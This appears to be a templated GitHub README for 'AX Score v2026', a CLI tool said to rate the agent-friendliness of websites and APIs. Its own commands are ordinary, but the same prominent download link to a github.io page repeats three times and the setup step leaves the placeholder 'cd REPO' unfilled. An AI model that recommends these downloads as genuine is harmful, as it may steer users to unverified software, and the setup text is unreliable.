# AX Score v2026 - CLI tool / library 2026

> **AX Score is an open-source command-line tool and library for checking the agent-friendliness of websites and APIs in AI-agent and LLM workflows. Version 2026 emphasizes practical agent interaction and audits that are ready for inspection.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/willhayesqf2964/ax-score-cli-v2026?style=flat-square)](https://github.com/willhayesqf2964/ax-score-cli-v2026)

---

<p align="center">
  <a href="https://willhayesqf2964.github.io/ax-score-cli-v2026/">
    <img src="https://img.shields.io/badge/Download-AX%20Score%20Latest-brightgreen?style=for-the-badge" alt="Download AX Score">
  </a>
</p>

> **[Download AX Score v2026](https://willhayesqf2964.github.io/ax-score-cli-v2026/)**

---

[Download Latest Build](https://willhayesqf2964.github.io/ax-score-cli-v2026/)

---

## What AX Score Does

AX Score converts the quality of website and API interactions into measurable information about agent-friendliness. It is intended for developers and teams building with AI agents, LLMs, and automated processes that require dependable inputs for navigation, inspection, and task completion.

Because the project is provided as both a CLI application and an importable library, it supports one-off checks as well as repeatable, scripted evaluation. Use it to review a website, examine API behavior, or add agent-experience analysis to a broader testing system.

---

## Capabilities

- Evaluates websites and APIs for AI-agent usability
- Offers both command-line and library-based access
- Supports audits of web and API workflows
- Can be incorporated into inspection, automation, and evaluation processes
- Targets scenarios involving AI agents and LLMs
- Enables consistent analysis across multiple services or endpoints
- Designed for TypeScript development and integration
- Released as open-source software for self-hosted use

---

## Getting Started

Obtain the repository or project files and install its dependencies in your TypeScript-oriented environment:

git clone https://github.com/willhayesqf2964/ax-score-cli-v2026.git
cd REPO
npm install

Once setup is complete, launch the CLI entry point for command-line checks, or import the library when AX Score needs to run as part of another application.

---

## Running AX Score

Choose the CLI for a direct audit, or embed the library when scoring belongs inside an existing evaluation system.

A common process looks like this:

1. Provide a website or API as the audit target.
2. Start an audit or scoring operation.
3. Examine the resulting agent-friendliness indicators.
4. Pass the results to automation, reports, or LLM evaluation tooling.

The standard Node-style CLI invocation is:

npm run start -- <target>

For programmatic use, import AX Score into a TypeScript project and connect it to your own inspection or scoring logic.

---

## Configuration

Keep AX Score settings close to the script, CI job, or evaluation workflow that consumes them. This makes repeated audits easier to reproduce across local and automated environments.

For example:

{
  "target": "https://example.com",
  "mode": "audit",
  "output": "report.json"
}

Environment variables can also hold the target, output location, and execution mode when the same audit must run in multiple environments.

---

## Requirements

- A web environment or Node-based runtime for using the CLI or library
- A development setup compatible with TypeScript
- Network access to the website or API being evaluated
- Storage capacity for logs, reports, and exported evaluation data
- A repeatable way to execute inspection or scoring jobs when ongoing analysis is required

---

## Frequently Asked Questions

**What does AX Score evaluate?**  
AX Score measures how well a website or API supports AI agents and LLM-powered workflows.

**Is it suitable for automated checks?**  
Yes. The project is built for scripted audits, inspection tasks, and evaluation pipelines.

**Can AX Score be integrated into another application?**  
Yes. Run it through the CLI, or use its library interface from your codebase.

**How should configuration be managed?**  
Place settings in project configuration files or provide them through environment variables, based on how your audits are executed.

**Where can I find newer versions?**  
Use the repository releases or the latest build link provided above to check for the current version.

**What should I check when a run fails?**  
Make sure the target can be reached, inspect the configuration, and confirm that the runtime and installed dependencies fit your environment.

---

## License

AX Score is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the complete license text.
